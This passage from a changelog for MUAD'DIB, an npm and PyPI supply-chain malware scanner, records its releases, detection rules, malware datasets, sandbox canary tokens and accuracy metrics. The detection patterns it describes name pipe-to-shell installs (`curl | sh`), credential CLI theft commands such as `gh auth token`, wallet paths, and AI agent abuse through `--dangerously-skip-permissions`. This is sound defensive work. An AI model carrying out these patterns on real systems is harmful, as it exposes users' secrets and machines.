- **Evaluate now scans real source code**: Rewritten to download real npm tarballs via `npm pack`, extract with native Node.js (`zlib.gunzipSync` + tar parser, no shell `tar` dependency), and scan the actual package source with all 14 scanners.

### Added
- **Benign dataset expansion**: 98 → 529 npm packages, 50 → 132 PyPI packages across 18+ categories
- **Ground truth malware database**: `datasets/ground-truth/known-malware.json` — 65 documented real-world malicious packages (45 npm, 18 PyPI, 2 cross-ecosystem) with metadata (name, ecosystem, version, date, source, technique, url, severity)
- **Tarball caching**: Downloaded packages cached in `.muaddib-cache/benign-tarballs/` to avoid re-downloading
- **`--benign-limit N` flag**: Only test first N benign packages (useful for quick iteration)
- **`--refresh-benign` flag**: Force re-download of all cached tarballs
- **FP debugging output**: False positive entries now include full threat details (type, severity, message, file)

### Changed
- **Real FPR measured for the first time: 38% (19/50)** on actual source code. Top FP causes: `dynamic_require` (127 hits), `dangerous_call_function` (90), `prototype_hook` (67), `env_access` (61). Worst offenders: next, gatsby, restify, moleculer, keystone, total.js, htmx.org (all score 100).
- Benign package list: `datasets/benign/packages-npm.txt` expanded from 98 to 529 unique packages
- PyPI package list: `datasets/benign/packages-pypi.txt` expanded from 50 to 132 unique packages
- Evaluate reports `scanned` and `skipped` counts for benign packages

### Breaking Changes
- None. All changes are additive. FPR metric now reflects real scanning results.

## [2.2.6] - 2026-02-20

### Added
- **Inter-module dataflow analysis** (`src/scanner/module-graph.js`): New 14th scanner that tracks tainted data across file boundaries. Builds a module dependency graph, annotates tainted exports (fs.readFileSync, process.env, os.homedir, child_process), and detects when credentials read in one module reach a network/exec sink in another module.
  - 3-hop taint propagation through re-export chains (A → B → C)
  - Class method analysis: tracks tainted sources through class declarations and method bodies
  - Inline require re-export: `module.exports = require('./source')` propagation
  - Function-wrapped taint propagation: `module.exports = fn(taintedVar)` tracking
  - Named export destructuring: `const { getCredentials } = require('./utils')` resolution
  - Instance propagation: `new Collector()` inherits taint from imported class
- **New rule `cross_file_dataflow`** (MUADDIB-FLOW-004): detects credential read in one module exported and sent to network in another module — inter-file exfiltration. Severity: CRITICAL, MITRE T1041.
- **`--no-module-graph` flag**: Disable inter-module dataflow analysis
- **Holdout v5 validation**: 10 new unseen samples specifically testing inter-module dataflow — 50% pre-tuning detection rate (5/10). First holdout for a new scanner. 2 accepted limitations (EventEmitter pub/sub, callback-based taint). Post-correction: 8/10.
- 822 tests (was 805 in v2.2.5), +17 new tests

### Changed
- Rule count: 92 → 93 (+1 new rule: MUADDIB-FLOW-004)
- Scanner count: 13 → 14 (module-graph runs before individual scanners)
- Holdout v5 dataset: 10 new samples in `datasets/holdout-v5/`
- Holdout progression: 30% → 40% → 60% → 80% → **50%** (new scanner baseline)

### Breaking Changes
- None. All changes are additive. `--no-module-graph` disables the new feature if needed.

## [2.2.5] - 2026-02-20

### Added
- **Deobfuscation pre-processing** (`src/scanner/deobfuscate.js`): Static AST-based deobfuscation applied before AST and dataflow scanners. 4 transformations + const propagation:
  - String concatenation folding (`'chi' + 'ld_' + 'process'` → `'child_process'`)
  - CharCode reconstruction (`String.fromCharCode(104,116,116,112)` → `'http'`)
  - Base64 decode (`Buffer.from('Y2hpbGRfcHJvY2Vzcw==','base64').toString()` → `'child_process'`, `atob(...)` → decoded string)
  - Hex array resolution (`[0x63,0x68].map(c=>String.fromCharCode(c)).join('')` → `'ch'`)
  - Const propagation: resolves `const x = 'literal'` references, then re-folds concatenations
- **`--no-deobfuscate` flag**: Disable deobfuscation pre-processing
- **New rule `staged_eval_decode`** (MUADDIB-AST-021): detects `eval()` or `Function()` receiving a decoded argument (`atob(...)` or `Buffer.from().toString('base64')`) — staged payload execution pattern. Severity: CRITICAL, MITRE T1140.
- **Chained dynamic require detection**: `require(non-literal).exec(...)` now detected as `dynamic_require_exec` (previously only tracked the two-statement pattern `const mod = require(...); mod.exec(...)`)
- **Holdout v4 validation**: 10 new unseen samples specifically testing deobfuscation effectiveness — 80% pre-tuning detection rate (8/10). Measures generalization improvement over holdout v3 (60%).
- 805 tests (was 781 in v2.2.2), +24 new tests (25 deobfuscation unit tests)

### Changed
- Rule count: 91 → 92 (+1 new rule: MUADDIB-AST-021)
- Deobfuscation uses **additive approach**: original code is scanned first (preserving obfuscation-detection signals), then deobfuscated code is scanned for additional findings hidden by obfuscation
- Holdout v4 dataset: 10 new samples in `datasets/holdout-v4/`
- Holdout progression: 30% → 40% → 60% → **80%** (+20pp per batch, consistent improvement)

### Breaking Changes
- None. All changes are additive. `--no-deobfuscate` disables the new feature if needed.

## [2.2.2] - 2026-02-20

### Added
- **Holdout v3 validation**: 10 new unseen samples evaluated with frozen rules — 60% pre-tuning detection rate (6/10). Measures generalization improvement over holdout v2 (40%).
- **4 new detection capabilities** closing holdout v3 blind spots:
  - `require_cache_poison` (MUADDIB-AST-019): detects `require.cache` access for module cache poisoning — hijacking loaded Node.js modules (https, http, fs) to intercept traffic
  - `staged_binary_payload` (MUADDIB-AST-020): detects binary file reference (.png/.jpg/.wasm) combined with `eval()` in same file — steganographic payload execution
  - Extended `dns.resolveTxt` as dataflow network sink: enables staged_payload detection for DNS TXT record payload retrieval + eval pattern
  - Shell process spawn detection: `spawn('/bin/sh')`, `spawn('cmd.exe')`, conditional shell binary via ternary — direct shell process spawn
  - Instance `socket.connect(port, host)` detection: recognizes `.connect()` on socket variables (not just `net.connect`) when file imports `net` or `tls`

### Changed
- Rule count: 89 → 91 (+2 new rules: MUADDIB-AST-019, MUADDIB-AST-020)
- Holdout v3 dataset: 10 new samples in `datasets/holdout-v3/`

### Breaking Changes
- None. All changes are additive.

## [2.2.1] - 2026-02-20

### Added
- **Holdout v2 validation**: 10 new unseen samples evaluated with frozen rules — 40% pre-tuning detection rate (4/10). Measures generalization improvement over holdout v1 (30%).
- **6 new detection capabilities** closing holdout v2 blind spots:
  - `env_charcode_reconstruction` (MUADDIB-AST-018): detects `String.fromCharCode` used to reconstruct env var names and evade static analysis of `process.env` access
  - `lifecycle_shell_pipe` (MUADDIB-PKG-010): detects `curl | sh` or `wget | sh` piped to shell in preinstall/install/postinstall lifecycle scripts
  - `credential_tampering` (MUADDIB-FLOW-003): detects cache poisoning patterns — sensitive data read + write to npm/yarn/pip cache paths (`_cacache`, `.cache/yarn`, `.cache/pip`)
  - Extended `env_proxy_intercept` (MUADDIB-AST-009): now detects `Object.defineProperty(process.env, ...)` getter traps
  - Extended `prototype_hook` (MUADDIB-AST-017): now detects Node.js core module prototype hijacking (`http.IncomingMessage.prototype`, `stream.Readable.prototype`, etc.)
  - Extended `workflow_write` (MUADDIB-AST-015): variable propagation through `path.join()`, regex fallback for files that fail AST parsing (e.g. GitHub Actions `${{ }}` expressions)
- **Dataflow scanner enhancements**: `process.env[computed]` (dynamic bracket access) tracked as env_read source, sensitive path variable propagation through `path.join`/`path.resolve`, separate file_tamper sinks from exfiltration sinks
- Adversarial dataset expanded: 35 → 45 samples (10 promoted from holdout v2)
- `muaddib-ignore` directive: add `// muaddib-ignore` in the first 5 lines of a file to skip dataflow analysis (like eslint-disable)
- `--exclude` now supports path-based patterns (e.g. `--exclude src/scanner`) in addition to bare directory names

### Changed
- Rule count: 86 → 89 (+3 new rules)
- `workflow_write` severity escalated from HIGH to CRITICAL
- ADR: 35/35 → 45/45

### Breaking Changes
- None. All changes are additive.

## [2.2.0] - 2026-02-20

### Added
- **Evaluation Framework** (internal `evaluate` command): unified measurement of TPR (Ground Truth, 4 real-world attacks), FPR (Benign, 98 popular npm packages), and ADR (Adversarial, 35 evasive samples). Results saved to `metrics/v{version}.json` for regression tracking.
- **Adversarial dataset** (`datasets/adversarial/`): 35 evasive malicious samples across 4 red-team waves + promoted holdout, based on real 2025-2026 attack techniques (Shai-Hulud, PhantomRaven, s1ngularity/Nx, ToxicSkills, chalk/debug compromise).
- **Benign dataset** (`datasets/benign/packages-npm.txt`): 98 popular npm packages for false positive measurement.
- **Holdout validation**: 10 unseen samples evaluated with frozen rules to measure generalization (30% pre-tuning detection rate). Published alongside tuned ADR for experimental honesty.
- **13th scanner: AI Config Scanner** (`src/scanner/ai-config.js`): detects prompt injection in AI agent configuration files (`.cursorrules`, `.cursorignore`, `.windsurfrules`, `CLAUDE.md`, `AGENT.md`, `.github/copilot-instructions.md`, `copilot-setup-steps.yml`). 4 pattern categories: shell commands, exfiltration, credential access, injection instructions. Compound detection escalates to CRITICAL.
- **AST scanner enhancements**: credential CLI theft detection (`gh auth token`, `gcloud auth print-access-token`, `aws sts get-session-token`), workflow injection detection (fs.writeFileSync to `.github/workflows`), binary dropper detection (fs.chmodSync + exec temp file), prototype hooking detection (globalThis.fetch, XMLHttpRequest.prototype override), AI agent abuse detection (s1ngularity/Nx `--dangerously-skip-permissions`, `--yolo` flags), variable tracking for dangerous commands/workflow paths/temp paths.
- **Dataflow scanner enhancements**: crypto wallet paths (.ethereum, .electrum, .config/solana, .exodus, .bitcoin, .monero, .gnupg), OS fingerprint sources (os.hostname, os.networkInterfaces, os.userInfo), fs.readdirSync as credential source.
- **New detection rules**: MUADDIB-AST-008 through AST-017, MUADDIB-AICONF-001, MUADDIB-AICONF-002 (~30 new rules total, 86 rules cumulative).
- **Evaluation methodology documentation** (`docs/EVALUATION_METHODOLOGY.md`): experimental protocol, raw holdout scores, improvement cycle, attack technique sources.
- 781 tests (was 742 in v2.1.2), +39 new tests (11 AI config scanner + 13 evaluate + 15 AST enhancements)

### Changed
- Scanner count: 12 → 13 (added AI config scanner)
- Rule count: ~56 → 86 (~30 new rules)
- Test count: 742 → 781 (+5% increase)
- Architecture diagram updated with 13 scanners and v2.2 evaluation framework

### Breaking Changes
- None. All changes are additive. Existing scans benefit from improved detection without changes.

## [2.1.2] - 2026-02-14

### Added
- **CI-aware sandbox**: `sandbox-runner.sh` now simulates CI environments (CI, GITHUB_ACTIONS, GITLAB_CI, TRAVIS, CIRCLECI, JENKINS_URL) to trigger CI-aware malware that stays dormant outside CI pipelines.
- **Enriched canary tokens**: 6 static honeypot credentials (GITHUB_TOKEN, NPM_TOKEN, AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, SLACK_WEBHOOK_URL, DISCORD_WEBHOOK_URL) injected by `sandbox-runner.sh` as fallback to the dynamic canary system. `detectStaticCanaryExfiltration()` searches all report fields (HTTP bodies, DNS, TLS, filesystem, processes, install output).
- **Strict webhook filtering**: Monitor alerts are only sent for IOC matches, sandbox-confirmed threats, or canary token exfiltration — eliminating noise from heuristic-only detections.
- **IOC persistence**: IOC database now stored in `~/.muaddib/data/` instead of the package directory. Survives `npm update` and global installs.
- **UX recommendations**: Each threat now displays a remediation recommendation inline below the finding.
- 742 tests (was 709 in v2.1.0), +33 new tests (14 static canary + 10 SSRF + 9 security)

### Security
- **SSRF protection in downloadToFile**: Domain allowlist (registry.npmjs.org, pypi.org, etc.) + private IP blocking on redirects. Shared `src/shared/download.js` module replaces duplicated code in `temporal-ast-diff.js` and `monitor.js`.
- **Command injection fix**: `execSync` with template literals replaced by `execFileSync` with array arguments in tar extraction.
- **Path traversal fix**: `sanitizePackageName()` removes `..` sequences from package names used in temp directory paths.
- **Unprotected JSON.parse**: 2 bare `JSON.parse` calls in `monitor.js` (getPyPITarballUrl, getNpmLatestTarball) wrapped in try/catch.
- **Constant deduplication**: `NPM_PACKAGE_REGEX`, `MAX_TARBALL_SIZE`, `DOWNLOAD_TIMEOUT` centralized in `src/shared/constants.js` (was duplicated in 3-5 files).

### Changed
- Test count: 709 → 742 (+5% increase)
- New shared module: `src/shared/download.js` (SSRF-safe downloadToFile, extractTarGz, sanitizePackageName)
- Architecture diagram updated with CI-aware sandbox

### Breaking Changes
- None. All changes are additive or internal refactors.

## [2.1.0] - 2026-02-14

### Added
- **Ground Truth Dataset** (`muaddib replay` / `muaddib ground-truth`): 5 real-world supply-chain attacks (event-stream, ua-parser-js, coa, node-ipc, colors) with expected findings. Validates scanner detection coverage with automated replay. 100% detection rate (4/4 malware detected, 1 out of scope).
- **Detection Time Logging** (internal `detections` command): tracks `first_seen_at` timestamp for every detection, computes lead time vs. public advisory.
- **FP Rate Tracking** (internal `stats` command): daily scan statistics with total/clean/suspect/false_positive/confirmed counts and automatic FP rate computation.
- **Score Breakdown** (`muaddib scan --breakdown`): explainable score decomposition showing per-finding contribution with severity weights (CRITICAL=25, HIGH=10, MEDIUM=3, LOW=1).
- **Threat Feed API** (internal `feed`/`serve` commands): JSON threat feed for SIEM integration on VPS infrastructure.
- 709 tests (was 541 in v2.0.0), +168 new tests
- 74% code coverage (was ~65% in v2.0.0)
- New test files: `tests/integration/diff.test.js` (35 tests), `tests/integration/ground-truth.test.js`
- Expanded coverage for `src/diff.js`, `src/temporal-ast-diff.js`, `src/monitor.js`

### Changed
- Test count: 541 → 709 (+31% increase)
- Code coverage: ~65% → 74%
- Architecture diagram updated to include v2.1 validation & observability layer

### Breaking Changes
- None. All new features are additive. New user-facing commands: `replay`, `ground-truth`, and scan flag `--breakdown`. Internal infrastructure commands: `feed`, `serve`, `stats`, `detections`.

## [2.0.0] - 2026-02-13

### Added
- **Sudden Lifecycle Script Detection** (`--temporal`): detects when `preinstall`/`install`/`postinstall` scripts suddenly appear in a new version of a dependency (MUADDIB-TEMPORAL-001, 002, 003)
- **Temporal AST Diff** (`--temporal-ast`): downloads the two latest versions of each dependency and compares ASTs to detect newly added dangerous APIs — `child_process`, `eval`, `Function`, `net.connect`, `process.env`, `fetch` (MUADDIB-TEMPORAL-AST-001, 002, 003)
- **Publish Frequency Anomaly** (`--temporal-publish`): detects abnormal publishing patterns — burst of versions in 24h, dormant package spike (6+ months inactivity), rapid version succession (MUADDIB-PUBLISH-001, 002, 003)
- **Maintainer Change Detection** (`--temporal-maintainer`): detects maintainer changes between versions — new maintainer added, sole maintainer replaced (event-stream pattern), suspicious maintainer names, new publisher (MUADDIB-MAINTAINER-001, 002, 003, 004)
- **Canary Tokens / Honey Tokens** (sandbox): injects fake credentials (GITHUB_TOKEN, NPM_TOKEN, AWS keys) into sandbox environment and detects exfiltration attempts via HTTP, DNS, or stdout (MUADDIB-CANARY-001)
- `--temporal-full` flag to enable all 4 temporal analysis features at once
- `--no-canary` flag to disable canary token injection in sandbox
- 14 new detection rules (MUADDIB-TEMPORAL-*, MUADDIB-PUBLISH-*, MUADDIB-MAINTAINER-*, MUADDIB-CANARY-*)
- Test refactoring: 4000 lines → 16 modular test files
- 541 tests (was 370 in v1.8.0)

### Changed
- Paradigm shift: from IOC-based detection (reactive) to behavioral anomaly detection (proactive)
- Sandbox now injects canary tokens by default (disable with `--no-canary`)

### Breaking Changes
- None. All new features are opt-in via flags (`--temporal`, `--temporal-ast`, `--temporal-publish`, `--temporal-maintainer`, `--temporal-full`). Canary tokens in sandbox are enabled by default but can be disabled with `--no-canary`.

## [1.8.0] - 2026-02-13

### Added
- **Zero-day monitor** (internal infrastructure): continuous polling of npm and PyPI registries via RSS (60s interval), automatic download/extract/scan of every new package
- **Discord webhook alerts**: rich embeds with severity color, emoji indicators, package link, ecosystem, sandbox score, readable timestamps
- **Automated daily report**: 24h summary sent to Discord — packages scanned, clean, suspects, errors, top 3 suspects of the day
- **Bundled tooling false-positive filter**: findings from known bundled files (yarn.js, webpack.js, terser.js, esbuild.js, polyfills.js) are skipped instead of flagged as suspect
- **Webhook `rawPayload` option**: allows sending pre-built embeds (used by daily report)
- 370 tests (was 316 in v1.6.18)

### Fixed
- **npm polling**: migrated from deprecated `/-/all/since` endpoint (404) to `/-/rss` RSS feed
- **Tarball URL resolution**: PyPI and npm packages now resolve tarball URLs lazily via `resolveTarballAndScan()` before download, fixing ECONNREFUSED crashes on PyPI packages
- **processQueue**: now calls `resolveTarballAndScan()` instead of `scanPackage()` directly
- **Webhook 400 errors**: `trySendWebhook()` now computes `riskScore` and `riskLevel` for `webhookData.summary`, fixing Discord embed failures
- **extractTarGz test**: skipped on Windows where `tar --force-local` is not supported
- **Test framework**: added `skipped` counter to test results

### Changed
- `loadState()` uses `npmLastPackage` (string) instead of `npmLastKey` (timestamp)
- `parseNpmResponse()` removed, replaced by `parseNpmRss()` (same regex approach as PyPI)
- `formatDiscord()` enhanced with emoji title, Ecosystem field, Package Link field, Sandbox field, footer with UTC timestamp
- Monitor stats include `lastDailyReportTime` and `dailyAlerts` tracking

## [1.6.18] - 2026-02-12

### Changed
- Update all documentation for v1.6.18 (README, SECURITY, CHANGELOG, CLAUDE.md)
- 316 tests passing (was 296 in v1.6.11)
- Add complete rule ID table to SECURITY.md
- Add post-release documentation checklist to CLAUDE.md

## [1.6.17] - 2026-02-12

### Fixed
- **AST scanner**: `eval('literal')` now LOW severity, `eval(variable)` stays HIGH
- **AST scanner**: `Function('literal')` now LOW severity, `Function(variable)` now MEDIUM
- **Obfuscation scanner**: hex/unicode escape sequences alone no longer trigger alerts
- **Obfuscation scanner**: `.min.js` files with long single lines are now ignored
- Validated 0 false positives on express, lodash, axios, react

### Added
- CLI spinner during scan for both CLI and interactive menu (TTY mode)

## [1.6.16] - 2026-02-12

### Changed
- **Entropy scanner**: removed file-level entropy scan (MUADDIB-ENTROPY-002)
- **Entropy scanner**: added JS obfuscation pattern detection (MUADDIB-ENTROPY-003) — detects _0x* variables, encoded string arrays, eval/Function with high-entropy content, long base64 payloads
- **Entropy scanner**: string-level entropy (MUADDIB-ENTROPY-001) retained with threshold 5.5 bits + 50 chars minimum

## [1.6.15] - 2026-02-12

### Changed
- Add CLAUDE.md for Claude Code guidance
- Update logo, update scanner count to 12

## [1.6.14] - 2026-02-12

### Added
- **Shannon entropy scanner** — string-level and file-level entropy analysis for obfuscation detection

## [1.6.13] - 2026-02-12

## [1.6.12] - 2026-02-12

### Fixed
- Documentation audit corrections (carnet de bord, compact IOC, CI pipeline)

## [1.6.11] - 2026-02-12

### Fixed
- Remove Codecov token requirement for CI coverage uploads
- Documentation corrections: SECURITY.md webhook domains, PyPI scope, version table, dependency count
- Update test count (296) and scanner count (11) across all docs

## [1.6.10] - 2026-02-12

### Added
- 296 tests total (73.75% coverage) — webhook 93%, sandbox 71%, hooks-init 81%
- `--exclude` flag for scan command, CI self-scan excludes tests/ and docker/

### Fixed
- `imageExists` test works with or without Docker installed

### Security
- Audit v2: 27 HIGH issues corrected, CI self-scan with `--fail-on critical`
- Audit v3: 21 HIGH issues corrected, 0 CRITICAL remaining

## [1.6.8] - 2026-02-11

### Fixed
- Post-audit corrections: fail-closed design, warnings, package validation
- Sync package-lock.json

### Security
- Complete security audit: 114 issues corrected across 5 waves

## [1.6.7] - 2026-02-11

### Fixed
- Separate `muaddib update` (fast, ~5s, compact IOCs) and `muaddib scrape` (full, ~5min, OSV dumps)

## [1.6.6] - 2026-02-11

### Fixed
- CLI spinner with npm-style progress for downloads and parsing

## [1.6.5] - 2026-02-11

### Fixed
- `muaddib update` now triggers live scrape with progress feedback

## [1.6.4] - 2026-02-11

### Added
- **Sandbox network analysis** — DNS/HTTP/TLS capture, data exfiltration detection (16 patterns), strict mode with iptables, network report command

### Changed
- Bump eslint to 10.0.0, @eslint/js to 10.0.1

## [1.6.3] - 2026-02-11

### Fixed
- Minor fixes and improvements

## [1.6.2] - 2026-02-11

### Added
- **Python/PyPI support** — `src/scanner/python.js` parses requirements.txt, setup.py, pyproject.toml
- **PyPI IOC matching** — 10,000+ malicious PyPI packages from OSV dump
- **PyPI typosquatting detection** — Levenshtein distance with PEP 503 name normalization
- Python scan integration in main `Promise.all()` (11 scanners total)

## [1.6.1] - 2026-02-10

### Fixed
- Exclude 111MB iocs.json from git tracking

## [1.6.0] - 2026-02-10

### Added
- **IOC expansion to 225,000+ packages** — bulk OSV npm + PyPI dumps
- **Multi-factor typosquatting** — npm registry API metadata, composite scoring engine, metadata cache

## [1.5.0] - 2026-02-10

### Added
- **Behavioral sandbox (dynamic analysis)** — strace system tracing, tcpdump network capture, filesystem diff before/after install
- JSON structured report for sandbox findings
- Sandbox scoring engine (0-100 risk score)

## [1.4.3] - 2026-02-10

### Fixed
- Smart `env_access` detection to reduce false positives
- Alert deduplication for repeated threats on same file
- `muaddib version` command output

## [1.4.2] - 2026-02-10

### Added
- Security audit report PDF (`docs/MUADDIB_Security_Audit_Report_v1.4.1.pdf`)
- Updated README, threat-model, carnet de bord for v1.4.1

## [1.4.1] - 2026-02-09

### Security
- Fix 25 remaining audit issues (5 high, 11 medium, 9 low)
- YAML unsafe loading: enforce `JSON_SCHEMA` on all `yaml.load()` calls
- SSRF protection in IOC fetcher with redirect validation
- 18 missing rules added to `src/rules/index.js`

## [1.4.0] - 2026-02-09

### Security
- Fix 30 audit issues (3 critical, 9 high, 11 medium, 10 low)
- Total: **58 security issues fixed** across v1.4.0 and v1.4.1

## [1.3.1] - 2026-02-09

### Added
- Codecov coverage upload in CI pipeline
- 145 tests total (coverage improved from 52% to 81%)

## [1.3.0] - 2026-02-09

### Added
- **SECURITY.md** — security policy, vulnerability reporting, SSRF/XSS protections documented
- **Version check on startup** — notifies users of available updates
- Dependabot configuration for automated dependency updates
- GitHub Action moved to repository root for Marketplace publishing

### Changed
- Refactor: audit + quick wins (CVE fixes, DRY improvements, performance, tooling)
- Bump acorn 8.14.0 → 8.15.0, js-yaml 4.1.0 → 4.1.1, @inquirer/prompts 8.1.0 → 8.2.0

### Fixed
- Clean gitignore, remove generated files from repository

## [1.2.7] - 2026-01-29

### Added
- **`muaddib diff` command** - Compare threats between versions/commits, shows only NEW threats
- **`muaddib init-hooks` command** - Setup git pre-commit hooks automatically
- **Pre-commit framework integration** - `.pre-commit-hooks.yaml` with 4 hook types
- **Husky integration** - `hooks/husky.js` for npm-based projects
- **Native git hooks** - `hooks/pre-commit` and `hooks/pre-commit-diff`
- **GitHub Action on Marketplace** - Branding (shield icon), inputs/outputs, auto SARIF upload
- **Coverage reporting** - c8 + Codecov integration with badge
- **OpenSSF Scorecard** - Security best practices workflow with badge
- 9 new tests for diff and hooks modules (total: 91 tests)

### Changed
- Interactive menu now includes diff and init-hooks options
- README updated with diff and pre-commit documentation
- README.fr.md synchronized with English version

### Performance
- Parallelize all 11 scanners with `Promise.all()`
- Optimize IOC lookups with Map/Set (O(1) instead of O(n))
- Add SHA256 hash cache to avoid redundant calculations
- Handle symlinks safely with `lstatSync`

### Security
- XSS protection in HTML report generation with `escapeHtml()`
- Prevent command injection in safe-install
- SSRF protection in webhook module with domain whitelist

### Fixed
- Standardize all output messages to English

## [1.2.6] - 2025-01-15

### Changed
- Extract constants and pin all dependencies for reproducibility
- Improve CSV parsing with proper quote handling
- Standardize all output messages to English

### Fixed
- Fix git log command showing only recent commits

## [1.2.5] - 2025-01-14

### Added
- Whitelist tests for rehabilitated packages
- IOC matching tests with version wildcards
- Non-regression tests for popular packages (lodash, express, axios)

### Fixed
- False positives on rehabilitated packages (chalk, debug, ansi-styles)
- Update safe-install with better version checking

## [1.2.4] - 2025-01-13

### Changed
- Optimize IOC scraper with parallel fetching
- Fix updater merge logic for duplicate packages

### Performance
- Reduce scraper execution time by 60%

## [1.2.3] - 2025-01-12

### Added
- Scraper updates for latest IOCs
- Improved README documentation

### Fixed
- Various scraper edge cases

## [1.2.2] - 2025-01-11

### Changed
- Clean up unused dependencies
- Reduce package size

## [1.2.1] - 2025-01-10

### Security
- Prevent command injection in safe-install
- Prevent SSRF in webhook module
- Add URL validation with domain whitelist

### Added
- XSS protection in HTML report generation
- Extract utils module for shared functions
- Parallelize all scanners for better performance

## [1.2.0] - 2025-01-08

### Added
- Docker sandbox for behavioral analysis
- Paranoid mode for ultra-strict detection
- Dataflow analysis (credential read + network send)
- GitHub Actions workflow scanner

### Changed
- Optimize IOC lookups with Map/Set data structures
- Add hash cache for file scanning
- Handle symlinks safely

## [1.1.0] - 2025-01-05

### Added
- VS Code extension with auto-scan
- Discord/Slack webhook notifications
- SARIF output for GitHub Security integration
- HTML report generation
- Typosquatting detection with Levenshtein distance

### Changed
- Improve AST analysis with acorn-walk
- Add MITRE ATT&CK technique mapping
- Add response playbooks for each threat type

## [1.0.0] - 2025-01-01

### Added
- Initial release
- CLI with scan, install, watch, daemon commands
- IOC database with 1000+ malicious packages
- 6 threat intelligence sources:
  - GenSecAI Shai-Hulud Detector
  - DataDog Security Labs
  - OSSF Malicious Packages
  - GitHub Advisory Database
  - Snyk Known Malware
  - Static IOCs (Socket.dev, Phylum)
- AST analysis for dangerous patterns
- Shell script pattern detection
- Obfuscation detection
- Package.json lifecycle script analysis

[Unreleased]: https://github.com/DNSZLSK/muad-dib/compare/v2.5.8...HEAD
[2.5.8]: https://github.com/DNSZLSK/muad-dib/compare/v2.5.7...v2.5.8
[2.5.7]: https://github.com/DNSZLSK/muad-dib/compare/v2.5.6...v2.5.7
[2.5.6]: https://github.com/DNSZLSK/muad-dib/compare/v2.5.5...v2.5.6
[2.5.5]: https://github.com/DNSZLSK/muad-dib/compare/v2.5.4...v2.5.5
[2.5.4]: https://github.com/DNSZLSK/muad-dib/compare/v2.5.3...v2.5.4
[2.5.3]: https://github.com/DNSZLSK/muad-dib/compare/v2.5.2...v2.5.3
[2.5.2]: https://github.com/DNSZLSK/muad-dib/compare/v2.5.1...v2.5.2
[2.5.1]: https://github.com/DNSZLSK/muad-dib/compare/v2.5.0...v2.5.1
[2.5.0]: https://github.com/DNSZLSK/muad-dib/compare/v2.4.20...v2.5.0
[2.4.20]: https://github.com/DNSZLSK/muad-dib/compare/v2.4.9...v2.4.20
[2.4.9]: https://github.com/DNSZLSK/muad-dib/compare/v2.4.7...v2.4.9
[2.4.7]: https://github.com/DNSZLSK/muad-dib/compare/v2.3.1...v2.4.7
[2.3.1]: https://github.com/DNSZLSK/muad-dib/compare/v2.3.0...v2.3.1
[2.3.0]: https://github.com/DNSZLSK/muad-dib/compare/v2.2.24...v2.3.0
[2.2.24]: https://github.com/DNSZLSK/muad-dib/compare/v2.2.23...v2.2.24
[2.2.23]: https://github.com/DNSZLSK/muad-dib/compare/v2.2.22...v2.2.23
[2.2.22]: https://github.com/DNSZLSK/muad-dib/compare/v2.2.21...v2.2.22
[2.2.21]: https://github.com/DNSZLSK/muad-dib/compare/v2.2.20...v2.2.21
[2.2.20]: https://github.com/DNSZLSK/muad-dib/compare/v2.2.19...v2.2.20
[2.2.19]: https://github.com/DNSZLSK/muad-dib/compare/v2.2.18...v2.2.19
[2.2.18]: https://github.com/DNSZLSK/muad-dib/compare/v2.2.17...v2.2.18
[2.2.17]: https://github.com/DNSZLSK/muad-dib/compare/v2.2.16...v2.2.17
[2.2.16]: https://github.com/DNSZLSK/muad-dib/compare/v2.2.15...v2.2.16
[2.2.15]: https://github.com/DNSZLSK/muad-dib/compare/v2.2.14...v2.2.15
[2.2.14]: https://github.com/DNSZLSK/muad-dib/compare/v2.2.13...v2.2.14
[2.2.13]: https://github.com/DNSZLSK/muad-dib/compare/v2.2.12...v2.2.13
[2.2.12]: https://github.com/DNSZLSK/muad-dib/compare/v2.2.11...v2.2.12
[2.2.11]: https://github.com/DNSZLSK/muad-dib/compare/v2.2.10...v2.2.11
[2.2.10]: https://github.com/DNSZLSK/muad-dib/compare/v2.2.9...v2.2.10
[2.2.9]: https://github.com/DNSZLSK/muad-dib/compare/v2.2.8...v2.2.9
[2.2.8]: https://github.com/DNSZLSK/muad-dib/compare/v2.2.7...v2.2.8
[2.2.7]: https://github.com/DNSZLSK/muad-dib/compare/v2.2.6...v2.2.7
[2.2.6]: https://github.com/DNSZLSK/muad-dib/compare/v2.2.5...v2.2.6
[2.2.5]: https://github.com/DNSZLSK/muad-dib/compare/v2.2.2...v2.2.5
[2.2.2]: https://github.com/DNSZLSK/muad-dib/compare/v2.2.1...v2.2.2
[2.2.1]: https://github.com/DNSZLSK/muad-dib/compare/v2.2.0...v2.2.1
[2.2.0]: https://github.com/DNSZLSK/muad-dib/compare/v2.1.2...v2.2.0
[2.1.2]: https://github.com/DNSZLSK/muad-dib/compare/v2.1.0...v2.1.2
[2.1.0]: https://github.com/DNSZLSK/muad-dib/compare/v2.0.0...v2.1.0
[2.0.0]: https://github.com/DNSZLSK/muad-dib/compare/v1.8.0...v2.0.0
[1.8.0]: https://github.com/DNSZLSK/muad-dib/compare/v1.6.18...v1.8.0
[1.6.18]: https://github.com/DNSZLSK/muad-dib/compare/v1.6.17...v1.6.18
[1.6.17]: https://github.com/DNSZLSK/muad-dib/compare/v1.6.16...v1.6.17
[1.6.16]: https://github.com/DNSZLSK/muad-dib/compare/v1.6.15...v1.6.16
[1.6.15]: https://github.com/DNSZLSK/muad-dib/compare/v1.6.14...v1.6.15
[1.6.14]: https://github.com/DNSZLSK/muad-dib/compare/v1.6.13...v1.6.14
[1.6.13]: https://github.com/DNSZLSK/muad-dib/compare/v1.6.12...v1.6.13
[1.6.12]: https://github.com/DNSZLSK/muad-dib/compare/v1.6.11...v1.6.12
[1.6.11]: https://github.com/DNSZLSK/muad-dib/compare/v1.6.10...v1.6.11
[1.6.10]: https://github.com/DNSZLSK/muad-dib/compare/v1.6.8...v1.6.10
[1.6.8]: https://github.com/DNSZLSK/muad-dib/compare/v1.6.7...v1.6.8
[1.6.7]: https://github.com/DNSZLSK/muad-dib/compare/v1.6.6...v1.6.7
[1.6.6]: https://github.com/DNSZLSK/muad-dib/compare/v1.6.5...v1.6.6
[1.6.5]: https://github.com/DNSZLSK/muad-dib/compare/v1.6.4...v1.6.5
[1.6.4]: https://github.com/DNSZLSK/muad-dib/compare/v1.6.3...v1.6.4
[1.6.3]: https://github.com/DNSZLSK/muad-dib/compare/v1.6.2...v1.6.3
[1.6.2]: https://github.com/DNSZLSK/muad-dib/compare/v1.6.1...v1.6.2
[1.6.1]: https://github.com/DNSZLSK/muad-dib/compare/v1.6.0...v1.6.1
[1.6.0]: https://github.com/DNSZLSK/muad-dib/compare/v1.5.0...v1.6.0
